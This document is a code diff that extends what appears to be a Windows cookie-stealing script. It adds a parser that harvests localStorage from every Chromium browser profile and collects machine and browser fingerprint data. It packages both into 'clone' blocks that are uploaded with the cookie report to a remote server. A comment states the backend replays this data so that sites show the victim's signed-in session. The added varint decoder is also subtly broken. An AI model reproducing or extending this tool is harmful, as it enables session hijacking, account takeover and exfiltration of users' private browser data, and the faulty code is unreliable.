@@ -4,6 +4,7 @@
 #     "PythonForWindows",
 #     "cryptography",
 #     "requests",
+#     "cramjam",
 # ]
 # ///
 
@@ -25,6 +26,7 @@ import traceback
 from contextlib import contextmanager
 import tempfile
 import argparse
+import collections
 
 import windows
 import windows.crypto
@@ -819,6 +821,557 @@ def build_report(records):
 
 
 # ---------------------------------------------------------------------------
+# LevelDB reader — parses Chromium's localStorage (LevelDB SSTables + WAL)
+# ---------------------------------------------------------------------------
+# Every Chromium profile stores localStorage as a LevelDB instance in
+#   {profile}/Local Storage/leveldb/
+# Keys are in the form:  _https://origin\x00keyName
+# Values are the stored strings (UTF-16LE for Chromium, we decode to UTF-8).
+#
+# LevelDB SSTable (.ldb) layout:
+#   [data block]*  [meta block]*  [metaindex block]  [index block]  [footer 48B]
+# The footer contains BlockHandles (varint64 offset+size) for the metaindex and
+# index blocks. The index block maps last-key → BlockHandle for each data block.
+# Data blocks use restart-based prefix compression; blocks are often Snappy-
+# compressed. The WAL (.log) carries recent writes not yet compacted into .ldb.
+
+def _decode_varint32(data, pos):
+    """Read a 32-bit varint. Returns (value, new_pos) or (None, pos) on error."""
+    result = 0
+    for shift in (0, 7, 14, 21, 28):
+        if pos >= len(data):
+            return None, pos
+        b = data[pos]
+        pos += 1
+        result |= (b & 0x7F) << shift
+        if not (b & 0x80):
+            return result, pos
+    return None, pos   # too long for 32-bit
+
+def _decode_varint64(data, pos):
+    """Read a 64-bit varint. Returns (value, new_pos) or (None, pos) on error."""
+    result = 0
+    for shift in (0, 7, 14, 21, 28, 35, 42, 49, 56, 63):
+        if pos >= len(data):
+            return None, pos
+        b = data[pos]
+        pos += 1
+        result |= (b & 0x7F) << shift
+        if not (b & 0x80):
+            return result & 0xFFFFFFFFFFFFFFFF
+    if pos < len(data) and data[pos] & 0x80 == 0:
+        # 10th byte with high bit clear → 64-bit value complete
+        pos += 1
+    return None, pos
+
+def _decode_fixed32(data, pos):
+    if pos + 4 > len(data):
+        return None, pos
+    return struct.unpack_from("<I", data, pos)[0], pos + 4
+
+def _snappy_decompress(raw):
+    """Decompress Snappy-compressed bytes using cramjam. Returns bytes or None."""
+    try:
+        import cramjam
+        return cramjam.snappy.decompress(raw)
+    except Exception:
+        return None
+
+def _parse_block(data, want_keys=True):
+    """Parse a LevelDB data or index block (restart-based prefix compression).
+
+    Returns list of (key, value) byte pairs, preserving insertion order.
+    Skips entries whose value looks like a BlockHandle (used in index blocks)
+    by returning them as-is — the caller decides what to do.
+    """
+    if len(data) < 5:
+        return []
+    num_restarts = struct.unpack_from("<I", data, len(data) - 4)[0]
+    if num_restarts == 0:
+        return []
+    restart_end = len(data) - 4 - num_restarts * 4
+    if restart_end < 0:
+        return []
+
+    entries = []
+    key = b""
+    pos = 0
+    while pos < restart_end:
+        shared, pos = _decode_varint32(data, pos)
+        unshared, pos = _decode_varint32(data, pos)
+        vallen, pos = _decode_varint32(data, pos)
+        if shared is None or unshared is None or vallen is None:
+            break
+        if pos + unshared + vallen > len(data):
+            break
+        key = key[:shared] + data[pos:pos + unshared]
+        pos += unshared
+        value = data[pos:pos + vallen]
+        pos += vallen
+        entries.append((key, value))
+    return entries
+
+def _parse_sstable(path):
+    """Parse one .ldb SSTable file. Returns dict of key → value."""
+    result = {}
+    try:
+        sz = os.path.getsize(path)
+        if sz < 48:
+            return result
+        with open(path, "rb") as f:
+            f.seek(sz - 48)
+            footer = f.read(48)
+    except OSError:
+        return result
+
+    # Footer: metaindex_handle, index_handle, padding, magic (8B)
+    magic = footer[40:48]
+    if magic != b"\x57\xfb\x80\x8b\x24\x75\x47\xdb":
+        return result
+
+    fp = 0
+    meta_off, fp = _decode_varint64(footer, fp)
+    meta_sz, fp = _decode_varint64(footer, fp)
+    idx_off, fp = _decode_varint64(footer, fp)
+    idx_sz, fp = _decode_varint64(footer, fp)
+    if None in (meta_off, meta_sz, idx_off, idx_sz):
+        return result
+
+    # Read index block → list of (last_key, BlockHandle(offset, size)) for data blocks
+    index_entries = []
+    try:
+        with open(path, "rb") as f:
+            f.seek(idx_off)
+            raw = f.read(idx_sz)
+    except OSError:
+        return result
+    idx_decomp = _snappy_decompress(raw) if raw else None
+    idx_data = idx_decomp or raw
+    for ikey, ival in _parse_block(idx_data):
+        off, _ = _decode_varint64(ival, 0)
+        sz, _ = _decode_varint64(ival, _)
+        if off is not None and sz is not None:
+            index_entries.append((off, sz))
+
+    # Read each data block
+    try:
+        with open(path, "rb") as f:
+            for boff, bsz in index_entries:
+                f.seek(boff)
+                raw = f.read(bsz)
+                decomp = _snappy_decompress(raw) if raw else None
+                block_data = decomp or raw
+                for k, v in _parse_block(block_data):
+                    result[k] = v
+    except OSError:
+        pass
+    return result
+
+def _parse_wal(path):
+    """Parse a LevelDB Write-Ahead Log (.log). Returns dict of key→value.
+
+    WAL blocks are 32 KB. Each record: checksum(4) | length(2) | type(1) | data.
+    Types: 1=FULL, 2=FIRST, 3=MIDDLE, 4=LAST. Split records are reassembled.
+    """
+    BLOCK = 32768
+    result = {}
+    try:
+        with open(path, "rb") as f:
+            data = f.read()
+    except OSError:
+        return result
+
+    pos = 0
+    frag = b""
+    while pos + 7 <= len(data):
+        # Records never start at the very end of a block boundary — if the record
+        # header would straddle the boundary, the block remainder is zero-padded.
+        block_off = pos % BLOCK
+        if block_off + 7 > BLOCK:
+            pos += BLOCK - block_off
+            continue
+        checksum = struct.unpack_from("<I", data, pos)[0]
+        rec_len = struct.unpack_from("<H", data, pos + 4)[0]
+        rectype = data[pos + 6]
+        pos += 7
+        if rectype == 0:
+            continue
+        if pos + rec_len > len(data):
+            break
+        payload = data[pos:pos + rec_len]
+        pos += rec_len
+        # Skip CRC validation — LevelDB can function with a torn WAL on crash.
+        # We read optimistically: bad bytes won't match our key prefix filter anyway.
+        if rectype == 1:   # FULL
+            _insert_wal_record(result, payload)
+        elif rectype == 2: # FIRST
+            frag = payload
+        elif rectype == 3: # MIDDLE
+            frag += payload
+        elif rectype == 4: # LAST
+            frag += payload
+            _insert_wal_record(result, frag)
+            frag = b""
+    return result
+
+def _insert_wal_record(result, payload):
+    """Try to parse a WAL record as a Put(key, value) and insert into result."""
+    # LevelDB WAL records are WriteBatch entries:
+    #   sequence_number (8 bytes LE)
+    #   count (4 bytes LE)
+    #   For count N: repeated (type=1 for Put, key, value) triples
+    if len(payload) < 12:
+        return
+    seq = struct.unpack_from("<Q", payload, 0)[0]
+    cnt = struct.unpack_from("<I", payload, 8)[0]
+    p = 12
+    for _ in range(cnt):
+        if p >= len(payload):
+            break
+        op = payload[p]
+        p += 1
+        if op == 1:  # kTypeValue = Put
+            klen, p2 = _decode_varint32(payload, p)
+            if klen is None or p2 + klen > len(payload):
+                break
+            key = payload[p2:p2 + klen]
+            p = p2 + klen
+            vlen, p2 = _decode_varint32(payload, p)
+            if vlen is None or p2 + vlen > len(payload):
+                break
+            value = payload[p2:p2 + vlen]
+            p = p2 + vlen
+            result[key] = value
+        elif op == 0:  # kTypeDeletion = Delete
+            klen, p2 = _decode_varint32(payload, p)
+            if klen is None or p2 + klen > len(payload):
+                break
+            key = payload[p2:p2 + klen]
+            p = p2 + klen
+            result.pop(key, None)
+        else:
+            # Unknown op — skip to next record boundary (best-effort)
+            break
+
+def _read_leveldb_directory(dir_path):
+    """Read all (key → value) from a LevelDB directory. Merges SSTables + WALs.
+
+    WAL records (more recent) overwrite SSTable entries for the same key.
+    """
+    result = {}
+    if not os.path.isdir(dir_path):
+        return result
+    # SSTables (.ldb)
+    for name in sorted(os.listdir(dir_path)):
+        if name.endswith(".ldb"):
+            db = _parse_sstable(os.path.join(dir_path, name))
+            result.update(db)
+    # WALs (.log) — more recent, overwrite
+    for name in sorted(os.listdir(dir_path)):
+        if name.endswith(".log"):
+            wal = _parse_wal(os.path.join(dir_path, name))
+            result.update(wal)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# Chromium localStorage extraction
+# ---------------------------------------------------------------------------
+def _origin_from_key(raw_key):
+    """Extract origin from a Chromium localStorage LevelDB key.
+
+    Keys are formed as:  _{origin}\x00{storageKey}
+    where origin is like 'https://accounts.google.com'.
+    Returns (origin_str, storage_key_str) or (None, None).
+    """
+    if not raw_key or raw_key[0:1] != b"_":
+        return None, None
+    # Chromium stores values as UTF-16LE; keys are ASCII with \x00 separator.
+    try:
+        key_str = raw_key.decode("utf-8", errors="replace")
+    except Exception:
+        return None, None
+    idx = key_str.find("\x00")
+    if idx <= 1:
+        return None, None
+    origin = key_str[1:idx]   # strip the leading '_'
+    storage_key = key_str[idx + 1:]
+    return origin, storage_key
+
+def _decode_local_storage_value(raw_value):
+    """Chromium encodes localStorage values as UTF-16LE, prefixed with \x01."""
+    if not raw_value or len(raw_value) < 2:
+        return ""
+    # First byte(s) may be a type marker (\x01 for string, \x00 for undefined).
+    val = raw_value
+    if val[0:1] == b"\x01":
+        val = val[1:]
+    elif val[0:2] == b"\x00\x00":
+        val = val[2:]
+    try:
+        return val.decode("utf-16-le", errors="replace")
+    except Exception:
+        return val.decode("utf-8", errors="replace")
+
+def extract_chromium_local_storage(profile_path):
+    """Extract localStorage for one Chromium profile → {origin: {key: value}}.
+
+    Reads {profile}/Local Storage/leveldb/ (LevelDB), decodes keys grouped by
+    origin, converts UTF-16LE values to plain strings. Session Storage in Chromium
+    is volatile (in-memory + temp files that vanish when the browser closes), so
+    only localStorage can be reliably extracted offline.
+    """
+    leveldb_dir = os.path.join(profile_path, "Local Storage", "leveldb")
+    if not os.path.isdir(leveldb_dir):
+        return {}
+    raw = _read_leveldb_directory(leveldb_dir)
+    origins = collections.OrderedDict()
+    for k, v in raw.items():
+        origin, key = _origin_from_key(k)
+        if not origin or not key:
+            continue
+        val = _decode_local_storage_value(v)
+        origins.setdefault(origin, collections.OrderedDict())[key] = val
+    return origins
+
+
+# ---------------------------------------------------------------------------
+# Browser / machine fingerprint
+# ---------------------------------------------------------------------------
+# Map Windows timezone keys → IANA timezone IDs (most common entries).
+_WINDOWS_TO_IANA_TZ = {
+    # Africa
+    "W. Central Africa Standard Time": "Africa/Lagos",
+    "South Africa Standard Time": "Africa/Johannesburg",
+    "Egypt Standard Time": "Africa/Cairo",
+    "E. Africa Standard Time": "Africa/Nairobi",
+    "Morocco Standard Time": "Africa/Casablanca",
+    # Americas
+    "Eastern Standard Time": "America/New_York",
+    "Central Standard Time": "America/Chicago",
+    "Mountain Standard Time": "America/Denver",
+    "Pacific Standard Time": "America/Los_Angeles",
+    "Atlantic Standard Time": "America/Halifax",
+    "SA Pacific Standard Time": "America/Bogota",
+    "SA Western Standard Time": "America/La_Paz",
+    "Central Brazilian Standard Time": "America/Cuiaba",
+    "E. South America Standard Time": "America/Sao_Paulo",
+    "Argentina Standard Time": "America/Argentina/Buenos_Aires",
+    "Mexico Standard Time": "America/Mexico_City",
+    "Canada Central Standard Time": "America/Regina",
+    # Europe
+    "GMT Standard Time": "Europe/London",
+    "Greenwich Standard Time": "Africa/Abidjan",
+    "W. Europe Standard Time": "Europe/Berlin",
+    "Central Europe Standard Time": "Europe/Budapest",
+    "Romance Standard Time": "Europe/Paris",
+    "Central European Standard Time": "Europe/Warsaw",
+    "E. Europe Standard Time": "Europe/Bucharest",
+    "Turkey Standard Time": "Europe/Istanbul",
+    "Russian Standard Time": "Europe/Moscow",
+    # Asia / Pacific
+    "Arabian Standard Time": "Asia/Dubai",
+    "Arab Standard Time": "Asia/Riyadh",
+    "Iran Standard Time": "Asia/Tehran",
+    "India Standard Time": "Asia/Kolkata",
+    "SE Asia Standard Time": "Asia/Bangkok",
+    "Singapore Standard Time": "Asia/Singapore",
+    "China Standard Time": "Asia/Shanghai",
+    "Tokyo Standard Time": "Asia/Tokyo",
+    "Korea Standard Time": "Asia/Seoul",
+    "AUS Eastern Standard Time": "Australia/Sydney",
+    "New Zealand Standard Time": "Pacific/Auckland",
+}
+
+def _get_screen_resolution():
+    """Actual screen dimensions via GetSystemMetrics."""
+    try:
+        user32 = ctypes.windll.user32
+        return {
+            "width": user32.GetSystemMetrics(0),   # SM_CXSCREEN
+            "height": user32.GetSystemMetrics(1),  # SM_CYSCREEN
+        }
+    except Exception:
+        return {"width": 1920, "height": 1080}
+
+def _get_windows_timezone_key():
+    """Windows timezone key name via GetDynamicTimeZoneInformation."""
+    try:
+        class DYNAMIC_TIME_ZONE_INFORMATION(ctypes.Structure):
+            _fields_ = [
+                ("Bias", wintypes.LONG),
+                ("StandardName", wintypes.WCHAR * 32),
+                ("StandardDate", wintypes.SYSTEMTIME),
+                ("StandardBias", wintypes.LONG),
+                ("DaylightName", wintypes.WCHAR * 32),
+                ("DaylightDate", wintypes.SYSTEMTIME),
+                ("DaylightBias", wintypes.LONG),
+                ("TimeZoneKeyName", wintypes.WCHAR * 128),
+                ("DynamicDaylightTimeDisabled", wintypes.BOOLEAN),
+            ]
+        dtzi = DYNAMIC_TIME_ZONE_INFORMATION()
+        ctypes.windll.kernel32.GetDynamicTimeZoneInformation(ctypes.byref(dtzi))
+        return dtzi.TimeZoneKeyName, -dtzi.Bias  # minutes east of UTC
+    except Exception:
+        return "", 0
+
+def _get_iana_timezone():
+    """Convert Windows timezone key → IANA timezone ID."""
+    key, offset = _get_windows_timezone_key()
+    return _WINDOWS_TO_IANA_TZ.get(key, "")
+
+def _get_utc_offset_minutes():
+    _, offset = _get_windows_timezone_key()
+    return offset
+
+def _get_system_locale():
+    """Windows locale name via GetUserDefaultLocaleName (e.g. 'en-NG')."""
+    try:
+        buf = ctypes.create_unicode_buffer(85)
+        if ctypes.windll.kernel32.GetUserDefaultLocaleName(buf, 85):
+            return buf.value
+    except Exception:
+        pass
+    return ""
+
+def _get_accept_language():
+    """Build an Accept-Language string from the system locale."""
+    loc = _get_system_locale()
+    if not loc:
+        return "en-US,en;q=0.9"
+    lang = loc.replace("_", "-")
+    primary = lang.split("-")[0] if "-" in lang else lang
+    return f"{lang},{primary};q=0.9"
+
+def _get_cpu_cores():
+    return os.cpu_count() or 4
+
+def _get_device_memory():
+    """Total physical memory in GB (rounded)."""
+    try:
+        class MEMORYSTATUSEX(ctypes.Structure):
+            _fields_ = [
+                ("dwLength", wintypes.DWORD),
+                ("dwMemoryLoad", wintypes.DWORD),
+                ("ullTotalPhys", ctypes.c_uint64),
+                ("ullAvailPhys", ctypes.c_uint64),
+                ("ullTotalPageFile", ctypes.c_uint64),
+                ("ullAvailPageFile", ctypes.c_uint64),
+                ("ullTotalVirtual", ctypes.c_uint64),
+                ("ullAvailVirtual", ctypes.c_uint64),
+                ("ullAvailExtendedVirtual", ctypes.c_uint64),
+            ]
+        mem = MEMORYSTATUSEX()
+        mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
+        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
+        gb = mem.ullTotalPhys / (1024 ** 3)
+        # Round to powers of 2 that browsers report (1, 2, 4, 8, 16, 32)
+        for candidate in (1, 2, 4, 8, 16, 32):
+            if gb <= candidate:
+                return candidate
+        return 32
+    except Exception:
+        return 8
+
+def _get_platform_str():
+    """Platform string as reported by navigator.platform (e.g. 'Win32')."""
+    # Modern browsers report Win32 even on 64-bit.
+    return "Win32"
+
+def _get_os_version():
+    """Windows version like 'Windows 10.0.19045'."""
+    try:
+        v = sys.getwindowsversion()
+        return f"Windows {v.major}.{v.minor}.{v.build}"
+    except Exception:
+        return "Windows"
+
+def _get_browser_version(user_data_path):
+    """Read Chromium version from {user_data}/Last Version file."""
+    lv = os.path.join(user_data_path, "Last Version")
+    if os.path.isfile(lv):
+        try:
+            return open(lv, "r").read().strip()
+        except Exception:
+            pass
+    return ""
+
+def _build_chromium_ua(version, browser_name):
+    """Construct the browser's real User-Agent from its detected version."""
+    os_ver = _get_os_version()
+    nt_ver = os_ver.replace("Windows ", "")
+    base = (f"Mozilla/5.0 (Windows NT {nt_ver}; Win64; x64) "
+            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36")
+    if "Edge" in browser_name:
+        return base + f" Edg/{version}"
+    return base
+
+def collect_system_fingerprint():
+    """Collect machine-level fingerprint — same regardless of which browser."""
+    return {
+        "screen": _get_screen_resolution(),
+        "timezone": _get_iana_timezone(),
+        "utc_offset_minutes": _get_utc_offset_minutes(),
+        "locale": _get_system_locale(),
+        "accept_language": _get_accept_language(),
+        "cpu_cores": _get_cpu_cores(),
+        "device_memory": _get_device_memory(),
+        "platform": _get_platform_str(),
+        "os_version": _get_os_version(),
+    }
+
+def collect_browser_fingerprint(user_data_path, browser_name):
+    """Collect browser-specific fingerprint (mainly the real User-Agent)."""
+    version = _get_browser_version(user_data_path)
+    ua = _build_chromium_ua(version, browser_name) if version else ""
+    return {
+        "user_agent": ua,
+        "version": version,
+    }
+
+
+# ---------------------------------------------------------------------------
+# Storage + fingerprint serialization (appended to the cookie report)
+# ---------------------------------------------------------------------------
+STORAGE_BEGIN = "<<<CLONE_STORAGE_V1"
+STORAGE_END = "CLONE_STORAGE_V1>>>"
+FINGERPRINT_BEGIN = "<<<CLONE_FINGERPRINT_V1"
+FINGERPRINT_END = "CLONE_FINGERPRINT_V1>>>"
+
+def serialize_storage_block(storage_data):
+    """Serialize { (browser, profile): {origin: {local: {k:v}}} } → embedded JSON block.
+
+    The backend's cookies.py already reads this block and seeds localStorage via
+    an init_script that fires before every page's own scripts — so a site that
+    keeps its session token in JS storage sees a signed-in session immediately.
+    """
+    profiles_out = []
+    for (browser, profile), origins in storage_data.items():
+        norm = {}
+        for origin, data in origins.items():
+            if data.get("local"):
+                norm[origin] = {"local": data["local"]}
+        if norm:
+            profiles_out.append({
+                "browser": browser,
+                "profile": profile,
+                "origins": norm,
+            })
+    if not profiles_out:
+        return ""
+    payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
+    return f"\n\n{STORAGE_BEGIN}\n{payload}\n{STORAGE_END}\n"
+
+def serialize_fingerprint_block(machine_fp, browser_fps):
+    """Serialize {machine: {...}, browsers: {browser_name: {...}}}  → embedded JSON block."""
+    payload = json.dumps({
+        "machine": machine_fp,
+        "browsers": browser_fps,
+    }, separators=(",", ":"), ensure_ascii=False)
+    return f"\n{FINGERPRINT_BEGIN}\n{payload}\n{FINGERPRINT_END}\n"
+
+
+# ---------------------------------------------------------------------------
 # Main (now accepts parsed arguments)
 # ---------------------------------------------------------------------------
 def main(args):
@@ -861,10 +1414,47 @@ def main(args):
         except Exception as e:
             emit(f"    ! failed to process {b['name']}: {e}")
 
+    # --- Collect localStorage from Chromium profiles ---
+    emit("")
+    emit("Extracting localStorage from Chromium profiles...")
+    storage_data = {}   # { (browser, profile): {origin: {"local": {k:v}}} }
+    for b in chromium:
+        user_data = b["user_data"]
+        browser_name = b["name"]
+        profiles = enumerate_chromium_profiles(user_data)
+        for prof in profiles:
+            profile_dir = os.path.dirname(prof["cookie_db"])
+            ls = extract_chromium_local_storage(profile_dir)
+            if ls:
+                key = (browser_name, prof["profile"])
+                # Wrap each origin's key-value dict in the {"local": ...} shape
+                # the backend's parse_storage_block expects.
+                wrapped = {}
+                for origin, kvs in ls.items():
+                    wrapped[origin] = {"local": kvs}
+                storage_data[key] = wrapped
+                origin_count = len(ls)
+                emit(f"  {browser_name} / {prof['profile']}: {origin_count} origins with localStorage")
+
+    # --- Collect fingerprint data ---
+    emit("")
+    emit("Collecting browser fingerprint...")
+    machine_fp = collect_system_fingerprint()
+    browser_fps = {}
+    for b in chromium:
+        fp = collect_browser_fingerprint(b["user_data"], b["name"])
+        if fp["user_agent"] or fp["version"]:
+            browser_fps[b["name"]] = fp
+            emit(f"  {b['name']}: {fp['version']} → {fp['user_agent'][:80]}...")
+
     # Build the final report and collect all output lines.
     report_lines = build_report(records)
-    # Combine log_lines and report_lines into the full output.
-    full_output = "\n".join(log_lines) + "\n\n" + "\n".join(report_lines)
+
+    # Combine log_lines, report, storage block, and fingerprint block.
+    storage_block = serialize_storage_block(storage_data)
+    fingerprint_block = serialize_fingerprint_block(machine_fp, browser_fps)
+    full_output = ("\n".join(log_lines) + "\n\n" + "\n".join(report_lines)
+                   + storage_block + fingerprint_block)
 
     # Print the final report to console (already printed via emit, but let's show the extra sections)
     print("")
@@ -872,6 +1462,10 @@ def main(args):
     print("")
     for line in report_lines:
         print(line)
+    if storage_block:
+        print(storage_block)
+    if fingerprint_block:
+        print(fingerprint_block)
 
     # Upload the output to the remote server.
     upload_url = args.url
